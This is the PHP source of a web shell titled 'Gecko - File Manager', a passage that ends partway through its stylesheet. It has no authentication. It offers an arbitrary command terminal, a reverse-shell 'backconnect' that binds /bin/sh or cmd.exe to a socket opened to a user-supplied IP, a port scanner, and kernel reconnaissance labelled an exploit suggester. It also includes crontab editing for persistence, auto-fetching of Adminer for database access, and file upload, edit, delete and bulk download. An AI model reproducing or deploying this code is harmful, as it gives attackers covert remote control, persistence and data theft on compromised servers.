<?php
session_start();

if (isset($_REQUEST['action'])) {
    $action = $_REQUEST['action'];
    switch ($action) {
        // --- System & Tools ---
        case 'get_stats':
            handleGetStats();
            break;
        case 'adminer':
            handleAdminer();
            break;
        case 'port_scan':
            handlePortScan();
            break;
        case 'linux_exploit_suggester':
            handleLinuxExploitSuggester();
            break;
        case 'backconnect':
            handleBackconnect();
            break;
        case 'cron_manager':
            handleCronManager();
            break;
        case 'terminal':
            handleTerminal();
            break;

        // --- File Manager Actions ---
        case 'list':
            handleListFiles();
            break;
        case 'chdir':
            handleChdir();
            break;
        case 'create-dir':
        case 'create-file':
            handleCreateItem($action);
            break;
        case 'delete':
            handleDeleteItem();
            break;
        case 'rename':
            handleRenameItem();
            break;
        case 'chmod':
            handleChangePermissions();
            break;
        case 'get-content':
            handleGetFileContent();
            break;
        case 'save-content':
            handleSaveFileContent();
            break;
        case 'download':
            handleDownloadFile();
            break;
        case 'upload-file':
            handleUploadFiles();
            break;
        case 'bulk-delete':
            handleBulkDelete();
            break;
        case 'bulk-chmod':
            handleBulkChmod();
            break;
        case 'bulk-download':
            handleBulkDownload();
            break;

        default:
            send_error('Invalid action specified.');
            break;
    }
    exit; // Pastikan script berhenti setelah action selesai.
}

// =================================================================
// ACTION HANDLER FUNCTIONS
// Memisahkan setiap logika ke dalam fungsinya sendiri.
// =================================================================

function handleGetStats()
{
    header('Content-Type: application/json');

    function get_server_cpu_load()
    {
        if (function_exists('sys_getloadavg')) {
            $load = sys_getloadavg();
            return $load[0];
        }
        return 'N/A'; // Aman untuk OS non-Linux
    }

    $disk_total = @disk_total_space('/');
    $disk_free = @disk_free_space('/');
    $disk_used = $disk_total - $disk_free;
    $disk_percent = ($disk_total > 0) ? ($disk_used / $disk_total) * 100 : 0;

    $stats = [
        'user' => function_exists('get_current_user') ? get_current_user() : 'N/A',
        'php_version' => phpversion(),
        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
        'cpu_load' => get_server_cpu_load(),
        'disk' => [
            'total' => round($disk_total / (1024 * 1024 * 1024), 2),
            'used' => round($disk_used / (1024 * 1024 * 1024), 2),
            'percent' => round($disk_percent, 2),
        ]
    ];

    echo json_encode($stats);
}

function handleAdminer()
{
    $adminer_file = 'adminer.php';
    $adminer_url = 'https://www.adminer.org/latest.php';
    if (!file_exists($adminer_file)) {
        $adminer_content = @file_get_contents($adminer_url);
        if ($adminer_content === false) {
            header('Content-Type: text/html; charset=utf-8');
            echo "<h3>Gagal Mengunduh Adminer</h3>";
            echo "<p>Silakan unduh <code>adminer.php</code> secara manual dari situs resminya dan unggah ke direktori ini.</p>";
            exit;
        }
        file_put_contents($adminer_file, $adminer_content);
    }
    include $adminer_file;
}

function handlePortScan()
{
    header('Content-Type: application/json');
    $data = json_decode(file_get_contents('php://input'), true);
    $host = $data['host'] ?? '';
    $ports_str = $data['ports'] ?? '21,22,80,443,3306';
    $timeout = $data['timeout'] ?? 1;

    if (empty($host) || filter_var($host, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME) === false && filter_var($host, FILTER_VALIDATE_IP) === false) {
        send_error('Host is required or invalid.');
    }

    $ports_to_scan = [];
    foreach (explode(',', $ports_str) as $part) {
        $part = trim($part);
        if (strpos($part, '-') !== false) {
            list($start, $end) = explode('-', $part);
            if (is_numeric($start) && is_numeric($end)) {
                for ($i = intval($start); $i <= intval($end); $i++) {
                    $ports_to_scan[] = $i;
                }
            }
        } elseif (is_numeric($part)) {
            $ports_to_scan[] = intval($part);
        }
    }

    $open_ports = [];
    foreach (array_unique($ports_to_scan) as $port) {
        $connection = @fsockopen($host, $port, $errno, $errstr, $timeout);
        if (is_resource($connection)) {
            $open_ports[] = $port;
            fclose($connection);
        }
    }
    send_success(['host' => $host, 'open_ports' => $open_ports, 'scanned_ports' => $ports_to_scan]);
}

function handleLinuxExploitSuggester()
{
    header('Content-Type: application/json');
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        send_error("This tool is for Linux servers only.");
    }
    $commands = [
        'Kernel Version' => 'uname -a',
        'Distribution'   => 'lsb_release -a 2>/dev/null || cat /etc/*-release 2>/dev/null || cat /etc/issue 2>/dev/null',
        'Proc Version'   => 'cat /proc/version'
    ];
    $results = [];
    foreach ($commands as $label => $command) {
        $results[$label] = htmlspecialchars(safe_exec($command));
    }
    send_success(['results' => $results]);
}

function handleBackconnect()
{
    header('Content-Type: application/json');
    $data = json_decode(file_get_contents('php://input'), true);
    $ip = $data['ip'] ?? '';
    $port = intval($data['port'] ?? 0);

    if (empty($ip) || filter_var($ip, FILTER_VALIDATE_IP) === false) {
        send_error("Invalid IP address.");
    }
    if ($port <= 0 || $port > 65535) {
        send_error("Invalid port.");
    }

    set_time_limit(0);
    ignore_user_abort(true);
    session_write_close();

    $shell = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'cmd.exe' : '/bin/sh -i';
    $sock = @fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
        send_error("Failed to connect to $ip:$port. Error: $errstr ($errno)");
    }

    send_success(['message' => "Backconnect initiated to $ip:$port. Check your listener."]);
    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    } else {
        ob_flush();
        flush();
    }

    $descriptorspec = [0 => $sock, 1 => $sock, 2 => $sock];
    $process = proc_open($shell, $descriptorspec, $pipes);
    if (is_resource($process)) {
        proc_close($process);
    }
    fclose($sock);
}

function handleCronManager()
{
    header('Content-Type: application/json');
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        send_error("Cron Manager is for Linux servers only.");
    }

    $data = json_decode(file_get_contents('php://input'), true);
    $sub_action = $data['sub_action'] ?? 'list';

    switch ($sub_action) {
        case 'list':
            $output = safe_exec('crontab -l 2>&1');
            send_success(['cron_jobs' => (strpos($output, 'no crontab for') !== false || empty($output)) ? '' : $output]);
            break;
        case 'save':
            $jobs = $data['jobs'] ?? '';
            $tmp_file = tempnam(sys_get_temp_dir(), 'cron');
            file_put_contents($tmp_file, $jobs . PHP_EOL);
            // escapeshellarg sangat penting untuk keamanan
            $output = safe_exec('crontab ' . escapeshellarg($tmp_file) . ' 2>&1');
            unlink($tmp_file);
            empty($output) ? send_success(['message' => 'Crontab updated successfully.']) : send_error('Failed to update crontab: ' . $output);
            break;
        default:
            send_error('Invalid Cron Manager action specified.');
            break;
    }
}

/**
 * [MODIFIED] Handles terminal commands with real-time streaming for output.
 */
function handleTerminal()
{
    if (!isset($_SESSION['terminal_cwd'])) {
        $_SESSION['terminal_cwd'] = __DIR__;
    }
    $data = json_decode(file_get_contents('php://input'), true);
    $command = $data['cmd'] ?? '';
    $cwd = $_SESSION['terminal_cwd'];

    // Handle 'cd' commands, which don't stream output.
    if (preg_match('/^cd\s*(.*)$/', $command, $matches)) {
        $new_dir_str = trim($matches[1]);
        $new_dir_str = trim($new_dir_str, "\"'");
        $output = '';

        if (empty($new_dir_str) || $new_dir_str === '~') {
            $target_path = __DIR__;
        } else {
            // Handle absolute paths on both Windows and Linux
            $is_absolute = (DIRECTORY_SEPARATOR === '/' && substr($new_dir_str, 0, 1) === '/') ||
                (DIRECTORY_SEPARATOR === '\\' && preg_match('/^[a-zA-Z]:/', $new_dir_str));
            $target_path = $is_absolute ? $new_dir_str : $cwd . DIRECTORY_SEPARATOR . $new_dir_str;
        }

        $real_target_path = realpath($target_path);

        if ($real_target_path && is_dir($real_target_path)) {
            $_SESSION['terminal_cwd'] = $real_target_path;
        } else {
            $output = "cd: no such file or directory: " . htmlspecialchars($new_dir_str);
        }

        // Send a normal JSON response for 'cd' and exit.
        header('Content-Type: application/json');
        echo json_encode(['output' => $output]);
        exit;
    }
    // Handle executing other commands with streaming output.
    elseif (!empty($command)) {
        // Disable all levels of output buffering
        while (ob_get_level()) {
            ob_end_flush();
        }

        // Set headers for a streaming plain text response
        header('Content-Type: text/plain; charset=UTF-8');
        header('X-Content-Type-Options: nosniff');

        // Close the session to prevent blocking other requests
        session_write_close();
        set_time_limit(0); // Allow the command to run indefinitely

        $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
        $cd_command = $is_windows ? 'cd /d' : 'cd';

        // Construct command to first change directory, then execute the user's command
        $full_command = $cd_command . ' ' . escapeshellarg($cwd) . ' && ' . $command;

        $descriptorspec = [
            0 => ["pipe", "r"], // stdin
            1 => ["pipe", "w"], // stdout
            2 => ["pipe", "w"]  // stderr
        ];

        $process = proc_open($full_command, $descriptorspec, $pipes);

        if (is_resource($process)) {
            fclose($pipes[0]); // Not writing to stdin

            // Set stdout and stderr to non-blocking
            stream_set_blocking($pipes[1], false);
            stream_set_blocking($pipes[2], false);

            // Loop until the process finishes
            while (true) {
                $status = proc_get_status($process);
                if (!$status['running']) {
                    break;
                }

                $read_streams = [$pipes[1], $pipes[2]];
                $write_streams = null;
                $except_streams = null;

                // Wait for data on either stdout or stderr
                if (stream_select($read_streams, $write_streams, $except_streams, 0, 200000) > 0) {
                    foreach ($read_streams as $stream) {
                        $output = fread($stream, 8192); // Read in 8KB chunks
                        if ($output !== false && strlen($output) > 0) {
                            echo $output; // Send chunk to the browser
                            flush();       // Ensure it's sent immediately
                        }
                    }
                }
            }

            // Read any final output left in the pipes after the process exits
            $stdout_remains = stream_get_contents($pipes[1]);
            if ($stdout_remains) {
                echo $stdout_remains;
                flush();
            }
            $stderr_remains = stream_get_contents($pipes[2]);
            if ($stderr_remains) {
                echo $stderr_remains;
                flush();
            }

            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }
        exit; // Terminate script after streaming is complete
    }
    // Handle empty command submission
    else {
        header('Content-Type: application/json');
        echo json_encode(['output' => '']);
        exit;
    }
}


// =================================================================
// FILE MANAGER HANDLERS
// =================================================================
function get_fm_config()
{
    // Memusatkan konfigurasi file manager
    $root_dir = dirname($_SERVER['DOCUMENT_ROOT']);
    define('DOC_ROOT', realpath($root_dir) ?: realpath(__DIR__));

    if (!isset($_SESSION['fm_cwd'])) {
        $_SESSION['fm_cwd'] = DOC_ROOT;
    }
}

function handleListFiles()
{
    get_fm_config();
    list_files($_SESSION['fm_cwd']);
}

function handleChdir()
{
    get_fm_config(); // Tetap panggil ini untuk inisialisasi session dan DOC_ROOT
    $target_path = $_REQUEST['target_path'] ?? '';
    $current_cwd = $_SESSION['fm_cwd'];
    $new_full_path = '';

    // Logika untuk menentukan path baru, sudah baik dan tidak perlu diubah.
    $is_absolute = (DIRECTORY_SEPARATOR === '/' && substr($target_path, 0, 1) === '/') ||
        (DIRECTORY_SEPARATOR === '\\' && preg_match('/^[a-zA-Z]:/', $target_path));

    if ($target_path === '..') {
        $new_full_path = realpath($current_cwd . DIRECTORY_SEPARATOR . '..');
    } elseif (empty($target_path)) {
        $new_full_path = DOC_ROOT;
    } elseif ($is_absolute) {
        if (DIRECTORY_SEPARATOR === '\\' && preg_match('/^[a-zA-Z]:$/', $target_path)) {
            $target_path .= '\\';
        }
        $new_full_path = realpath($target_path);
    } else {
        $new_full_path = realpath($current_cwd . DIRECTORY_SEPARATOR . $target_path);
    }

    if ($new_full_path === false) {
        send_error('Invalid path specified or path does not exist: ' . htmlspecialchars($target_path));
    }

    // Jika path valid dan merupakan sebuah direktori, ubah CWD dan list file.
    if (is_dir($new_full_path)) {
        $_SESSION['fm_cwd'] = $new_full_path;
        list_files($new_full_path);
    } else {
        send_error('Failed to change directory or target is not a directory.');
    }
}

function get_validated_filepath($name_from_request)
{
    get_fm_config();
    // basename() adalah kunci untuk mencegah directory traversal (../../)
    $name = basename($name_from_request);
    $file_path = $_SESSION['fm_cwd'] . DIRECTORY_SEPARATOR . $name;

    if (!file_exists($file_path)) {
        send_error('Invalid path specified or file not found.');
    }
    return $file_path;
}

function handleCreateItem($action)
{
    get_fm_config();
    $name = $_POST['name'] ?? '';
    if ($action === 'create-dir') {
        create_directory($_SESSION['fm_cwd'], $name);
    } else {
        create_file($_SESSION['fm_cwd'], $name);
    }
}

function handleDeleteItem()
{
    $item_path = get_validated_filepath($_POST['name'] ?? '');
    delete_item_recursive($item_path);
    send_success(['message' => 'Item berhasil dihapus.']);
}

function handleRenameItem()
{
    get_fm_config();
    $old_name = basename($_POST['old_name'] ?? '');
    $new_name = basename($_POST['new_name'] ?? '');
    rename_item($_SESSION['fm_cwd'], $old_name, $new_name);
}

function handleChangePermissions()
{
    $item_path = get_validated_filepath($_POST['name'] ?? '');
    $perms = $_POST['perms'] ?? '';
    change_permissions($item_path, $perms);
}

function handleGetFileContent()
{
    $file_path = get_validated_filepath($_GET['name'] ?? '');
    get_file_content($file_path);
}

function handleSaveFileContent()
{
    $file_path = get_validated_filepath($_POST['name'] ?? '');
    $content = $_POST['content'] ?? '';
    save_file_content($file_path, $content);
}

function handleDownloadFile()
{
    $file_path = get_validated_filepath($_GET['name'] ?? '');
    download_file($file_path);
}

function handleUploadFiles()
{
    get_fm_config();
    upload_files($_SESSION['fm_cwd']);
}

function handleBulkDelete()
{
    get_fm_config();
    $items = json_decode($_POST['items'] ?? '[]', true);
    bulk_delete($_SESSION['fm_cwd'], $items);
}

function handleBulkChmod()
{
    get_fm_config();
    $items = json_decode($_POST['items'] ?? '[]', true);
    $perms = $_POST['perms'] ?? '';
    bulk_chmod($_SESSION['fm_cwd'], $items, $perms);
}

function handleBulkDownload()
{
    get_fm_config();
    $items = json_decode($_GET['items'] ?? '[]', true);
    bulk_download($_SESSION['fm_cwd'], $items);
}

// =================================================================
// HELPER & CORE FUNCTIONS
// =================================================================

function safe_exec($command)
{
    // Deteksi Windows / Unix
    $isWindows = (stripos(PHP_OS, "WIN") === 0);

    if ($isWindows) {
        // --- Windows ---
        if (PHP_VERSION_ID >= 70400 && extension_loaded("FFI")) {
            // Pakai FFI (Windows API)
            $ffi = FFI::cdef("
                typedef int BOOL;
                typedef void* HANDLE;
                typedef unsigned long DWORD;
                typedef const wchar_t* LPCWSTR;

                typedef struct _STARTUPINFOW {
                    DWORD cb;
                    LPCWSTR lpReserved;
                    LPCWSTR lpDesktop;
                    LPCWSTR lpTitle;
                    DWORD dwX;
                    DWORD dwY;
                    DWORD dwXSize;
                    DWORD dwYSize;
                    DWORD dwXCountChars;
                    DWORD dwYCountChars;
                    DWORD dwFillAttribute;
                    DWORD dwFlags;
                    WORD wShowWindow;
                    WORD cbReserved2;
                    BYTE* lpReserved2;
                    HANDLE hStdInput;
                    HANDLE hStdOutput;
                    HANDLE hStdError;
                } STARTUPINFOW;

                typedef struct _PROCESS_INFORMATION {
                    HANDLE hProcess;
                    HANDLE hThread;
                    DWORD dwProcessId;
                    DWORD dwThreadId;
                } PROCESS_INFORMATION;

                BOOL CreateProcessW(
                    LPCWSTR lpApplicationName,
                    LPCWSTR lpCommandLine,
                    void* lpProcessAttributes,
                    void* lpThreadAttributes,
                    BOOL bInheritHandles,
                    DWORD dwCreationFlags,
                    void* lpEnvironment,
                    LPCWSTR lpCurrentDirectory,
                    STARTUPINFOW* lpStartupInfo,
                    PROCESS_INFORMATION* lpProcessInformation
                );
            ", "kernel32.dll");

            $si = $ffi->new("STARTUPINFOW");
            $pi = $ffi->new("PROCESS_INFORMATION");
            $si->cb = FFI::sizeof($si);

            $wcmd = FFI::new("wchar_t[512]");
            FFI::memcpy(
                $wcmd,
                FFI::string("cmd.exe /c " . $command),
                2 * strlen("cmd.exe /c " . $command)
            );

            $res = $ffi->CreateProcessW(
                null,
                $wcmd,
                null,
                null,
                0,
                0,
                null,
                null,
                FFI::addr($si),
                FFI::addr($pi)
            );

            return $res
                ? "Process started (PID: " . $pi->dwProcessId . ")"
                : "Failed to execute via CreateProcessW";
        } else {
            // Fallback: pakai proc_open / popen biasa
            $descriptorspec = [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "w"]
            ];
            $process = proc_open($command, $descriptorspec, $pipes);
            $output = '';

            if (is_resource($process)) {
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
            }
            return $output;
        }
    } else {
        // --- Linux / Unix ---
        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];

        $process = proc_open($command, $descriptorspec, $pipes);
        $output = '';

        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }

        return $output;
    }
}

function send_error($message, $status_code = 400)
{
    header('Content-Type: application/json');
    http_response_code($status_code);
    echo json_encode(['success' => false, 'message' => $message]);
    exit;
}

function send_success($data = [])
{
    header('Content-Type: application/json');
    echo json_encode(array_merge(['success' => true], $data));
    exit;
}

function list_files($dir)
{
    if (!is_dir($dir)) send_error('Directory not found.');

    $files = [];
    $items = @scandir($dir);
    if ($items === false) send_error('Could not read directory. Check permissions.');

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;

        $item_path = $dir . DIRECTORY_SEPARATOR . $item;
        $is_dir = is_dir($item_path);
        $files[] = [
            'name' => $item,
            'type' => $is_dir ? 'folder' : 'file',
            'size' => $is_dir ? '-' : format_size(@filesize($item_path)),
            'last_modified' => date('Y-m-d H:i:s', @filemtime($item_path)),
            'permissions' => substr(sprintf('%o', @fileperms($item_path)), -4),
        ];
    }

    usort($files, function ($a, $b) {
        if ($a['type'] === 'folder' && $b['type'] !== 'folder') return -1;
        if ($a['type'] !== 'folder' && $b['type'] === 'folder') return 1;
        return strcasecmp($a['name'], $b['name']);
    });

    $display_path = str_replace(DOC_ROOT, '', $dir) ?: '/';

    $response_data = [
        'files' => $files,
        'path' => $display_path,
        'breadcrumbs' => generate_breadcrumbs($dir)
    ];

    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $drives = [];
        foreach (range('A', 'Z') as $drive) {
            if (is_dir($drive . ':\\')) {
                $drives[] = ['name' => $drive . ':', 'path' => $drive . ':\\'];
            }
        }
        $response_data['drives'] = $drives;
    }

    send_success($response_data);
}

function create_directory($path, $name)
{
    if (empty($name) || preg_match('/[\\/\:\*\?"<>\|]/', $name)) send_error('Invalid directory name.');
    $new_dir = $path . DIRECTORY_SEPARATOR . $name;
    if (file_exists($new_dir)) send_error('Directory already exists.');
    if (@mkdir($new_dir)) send_success(['message' => 'Directory created successfully.']);
    else send_error('Failed to create directory. Check permissions.');
}

function create_file($path, $name)
{
    if (empty($name) || preg_match('/[\\/\:\*\?"<>\|]/', $name)) send_error('Invalid file name.');
    $new_file = $path . DIRECTORY_SEPARATOR . $name;
    if (file_exists($new_file)) send_error('File already exists.');
    if (@touch($new_file)) send_success(['message' => 'File created successfully.']);
    else send_error('Failed to create file. Check permissions.');
}

function delete_item_recursive($item_path)
{
    if (is_dir($item_path)) {
        $it = new RecursiveDirectoryIterator($item_path, RecursiveDirectoryIterator::SKIP_DOTS);
        $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
        foreach ($files as $file) {
            $realPath = $file->getRealPath();
            $file->isDir() ? @rmdir($realPath) : @unlink($realPath);
        }
        @rmdir($item_path);
    } else {
        @unlink($item_path);
    }
}


function rename_item($path, $old_name, $new_name)
{
    if (empty($new_name) || preg_match('/[\\/\:\*\?"<>\|]/', $new_name)) send_error('Invalid new name.');
    $old_path = $path . DIRECTORY_SEPARATOR . $old_name;
    $new_path = $path . DIRECTORY_SEPARATOR . $new_name;
    if (!file_exists($old_path)) send_error('Original item not found.');
    if (file_exists($new_path)) send_error('An item with the new name already exists.');
    if (rename($old_path, $new_path)) send_success(['message' => 'Berhasil diubah nama.']);
    else send_error('Failed to rename. Check permissions.');
}

function change_permissions($item_path, $perms)
{
    if (!preg_match('/^[0-7]{4}$/', $perms)) send_error('Invalid permission format. Use a 4-digit octal value (e.g., 0755).');
    if (@chmod($item_path, octdec($perms))) send_success(['message' => 'Permissions changed successfully.']);
    else send_error('Failed to change permissions.');
}

function get_file_content($file_path)
{
    if (!is_file($file_path)) send_error('File not found.');
    $content = @file_get_contents($file_path);
    if ($content === false) send_error('Could not read file content.');
    else send_success(['content' => $content]);
}

function save_file_content($file_path, $content)
{
    if (!is_file($file_path)) send_error('File not found.');
    if (@file_put_contents($file_path, $content) !== false) send_success(['message' => 'File saved successfully.']);
    else send_error('Failed to save file. Check permissions.');
}

function download_file($file_path)
{
    if (is_file($file_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        flush();
        readfile($file_path);
        exit;
    } else {
        http_response_code(404);
        die('File not found.');
    }
}
function upload_files($path)
{
    if (empty($_FILES['files_to_upload'])) {
        send_error('Tidak ada file yang dipilih untuk diunggah.');
    }
    $files = $_FILES['files_to_upload'];
    $errors = [];
    $success_count = 0;
    $file_count = is_array($files['name']) ? count($files['name']) : 1;

    for ($i = 0; $i < $file_count; $i++) {
        $name = is_array($files['name']) ? $files['name'][$i] : $files['name'];
        $tmp_name = is_array($files['tmp_name']) ? $files['tmp_name'][$i] : $files['tmp_name'];
        $error = is_array($files['error']) ? $files['error'][$i] : $files['error'];

        if ($error !== UPLOAD_ERR_OK) {
            $errors[] = "$name (Error code: $error)";
            continue;
        }
        $file_name = basename($name);
        if (preg_match('/[\\/\:\*\?"<>\|]/', $file_name)) {
            $errors[] = "$file_name (Invalid characters in name)";
            continue;
        }
        $destination = $path . DIRECTORY_SEPARATOR . $file_name;
        if (file_exists($destination)) {
            $errors[] = "$file_name (File already exists)";
            continue;
        }
        if (move_uploaded_file($tmp_name, $destination)) {
            $success_count++;
        } else {
            $errors[] = "$file_name (Failed to move, check folder permissions)";
        }
    }

    if ($success_count > 0 && empty($errors)) {
        send_success(['message' => "$success_count file(s) uploaded successfully."]);
    } elseif ($success_count > 0) {
        send_error("Uploaded $success_count file(s), but failed for: " . implode(', ', $errors));
    } else {
        send_error('Upload failed. Errors: ' . implode(', ', $errors));
    }
}


function bulk_delete($path, $items)
{
    if (empty($items)) send_error('No items selected.');
    $errors = [];
    foreach ($items as $item_name) {
        $item_path = $path . DIRECTORY_SEPARATOR . basename($item_name);
        if (file_exists($item_path)) {
            delete_item_recursive($item_path);
        } else {
            $errors[] = $item_name;
        }
    }
    if (empty($errors)) send_success(['message' => count($items) . ' items deleted.']);
    else send_error('Could not delete: ' . implode(', ', $errors));
}

function bulk_chmod($path, $items, $perms)
{
    if (empty($items)) send_error('No items selected.');
    if (!preg_match('/^[0-7]{4}$/', $perms)) send_error('Invalid permission format.');
    $octal_perms = octdec($perms);
    $errors = [];
    foreach ($items as $item_name) {
        $item_path = $path . DIRECTORY_SEPARATOR . basename($item_name);
        if (file_exists($item_path) && !@chmod($item_path, $octal_perms)) {
            $errors[] = $item_name;
        }
    }
    if (empty($errors)) send_success(['message' => 'Permissions changed for ' . count($items) . ' items.']);
    else send_error('Could not change permissions for: ' . implode(', ', $errors));
}

function bulk_download($path, $items)
{
    if (!class_exists('ZipArchive')) send_error('ZipArchive class is not available.');
    if (empty($items)) send_error('No items selected for download.');

    $zip = new ZipArchive();
    $zip_name = 'download_' . time() . '.zip';
    $zip_path = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zip_name;

    if ($zip->open($zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
        send_error('Cannot create zip archive.');
    }

    foreach ($items as $item_name) {
        $item_path = $path . DIRECTORY_SEPARATOR . basename($item_name);
        if (file_exists($item_path)) {
            if (is_file($item_path)) {
                $zip->addFile($item_path, basename($item_name));
            } elseif (is_dir($item_path)) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($item_path, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                foreach ($files as $name => $file) {
                    if (!$file->isDir()) {
                        $filePath = $file->getRealPath();
                        $relativePath = basename($item_name) . '/' . substr($filePath, strlen($item_path) + 1);
                        $zip->addFile($filePath, $relativePath);
                    }
                }
            }
        }
    }
    $zip->close();

    if (file_exists($zip_path)) {
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . $zip_name . '"');
        header('Content-Length: ' . filesize($zip_path));
        readfile($zip_path);
        @unlink($zip_path);
        exit;
    } else {
        send_error('Could not create the zip file.');
    }
}


function generate_breadcrumbs($current_path)
{
    $breadcrumbs = [];
    $real_path = realpath($current_path);
    if ($real_path === false) return [['name' => 'Invalid Path', 'path' => '']];

    $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

    $base_path = DOC_ROOT;
    if (strpos($real_path, $base_path) !== 0) {
        $base_path = $is_windows ? '' : '/';
    }

    $relative_path = substr($real_path, strlen($base_path));
    $parts = explode(DIRECTORY_SEPARATOR, trim($relative_path, DIRECTORY_SEPARATOR));

    $path_builder = $base_path;
    $breadcrumbs[] = ['name' => '[ ROOT ]', 'path' => DOC_ROOT];

    foreach ($parts as $part) {
        if (empty($part)) continue;
        $path_builder .= DIRECTORY_SEPARATOR . $part;
        $breadcrumbs[] = ['name' => $part, 'path' => $path_builder];
    }
    return $breadcrumbs;
}

function format_size($bytes)
{
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}
?>
<!DOCTYPE html>
<html lang="id" data-bs-theme="dark">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Gecko - File Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
    <link rel="stylesheet" href="https://cdn.datatables.net/1.13.7/css/dataTables.bootstrap5.min.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Caveat:wght@400..700&display=swap');

        :root {
            --gh-dark-bg: #0d1117;
            --gh-dark-component-bg: #161b22;
            --gh-dark-border: #30363d;
            --gh-dark-text: #c9d1d9;
            --gh-dark-text-secondary: #8b949e;
            --gh-orange-accent: #f78166;
            --gh-orange-accent-hover: #fa9d89;
            --gh-blue-icon: #58a6ff;
        }

        body {
            background-color: var(--gh-dark-bg);
            color: var(--gh-dark-text);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji";
        }

        /* --- Custom Scrollbar --- */
        ::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }

        ::-webkit-scrollbar-track {
            background: var(--gh-dark-bg);
        }

        ::-webkit-scrollbar-thumb {
            background-color: #2c313a;
            border-radius: 10px;
            border: 2px solid var(--gh-dark-bg);
        }

        ::-webkit-scrollbar-thumb:hover {
            background-color: var(--gh-dark-border);
        }

        .main-layout {
            display: grid;
            grid-template-columns: 1fr 400px;
            gap: 1rem;
            align-items: stretch;
        }

        .file-manager-container {
            background-color: var(--gh-dark-component-bg);
            border: 1px solid var(--gh-dark-border);
            border-radius: 6px;
            padding: 0.5rem;
            display: flex;
            flex-direction: column;
        }

        .fm-header {
            padding: 1rem 1.5rem;
            border-bottom: 1px solid var(--gh-dark-border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1rem;
        }

        .breadcrumb-item a {
            color: var(--gh-orange-accent);
            text-decoration: none;
        }

        .breadcrumb-item a:hover {
            text-decoration: underline;
            color: var(--gh-orange-accent-hover);
        }

        .breadcrumb-item.active {
            color: var(--gh-dark-text-secondary);
        }

        #fileManagerTable_wrapper {
            padding: 1rem;
            flex-grow: 1;
        }

        .dataTables_wrapper .dataTables_length,
        .dataTables_wrapper .dataTables_filter,
        .dataTables_wrapper .dataTables_info,
        .dataTables_wrapper .dataTables_paginate {
            color: var(--gh-dark-text-secondary) !important;
        }

        .dataTables_wrapper .form-control {
            background-color: var(--gh-dark-bg);
            color: var(--gh-dark-text);
            border-color: var(--gh-dark-border);
        }

        .dataTables_wrapper .form-control:focus {
            background-color: var(--gh-dark-bg);
            color: var(--gh-dark-text);
            border-color: var(--gh-orange-accent);
            box-shadow: 0 0 0 0.25rem rgba(247, 129, 102, 0.25);
        }

        .page-item .page-link {
            background-color: var(--gh-dark-component-bg);
            border-color: var(--gh-dark-border);
            color: var(--gh-dark-text-secondary);
        }

        .page-item.active .page-link {
            background-color: var(--gh-orange-accent);
            border-color: var(--gh-orange-accent);
            color: var(--gh-dark-bg);
        }

        .page-item.disabled .page-link {
            background-color: var(--gh-dark-component-bg);
            border-color: var(--gh-dark-border);
            color: #666;
        }

        .table {
            --bs-table-bg: var(--gh-dark-component-bg);
            --bs-table-color: var(--gh-dark-text);
            --bs-table-border-color: var(--gh-dark-border);
            --bs-table-hover-bg: #1f242c;
            --bs-table-hover-color: var(--gh-dark-text);
        }

        .table thead th {
            font-weight: 600;
            color: var(--gh-dark-text-secondary);
            border-bottom-width: 1px;
        }

        .table td,
        .table th {
            vertical-align: middle;
        }

        .file-icon {
            color: var(--gh-dark-text-secondary);
            margin-right: 10px;
            width: 20px;
            text-align: center;
        }

        .folder-icon {
            color: var(--gh-blue-icon);
        }

        .file-name a {
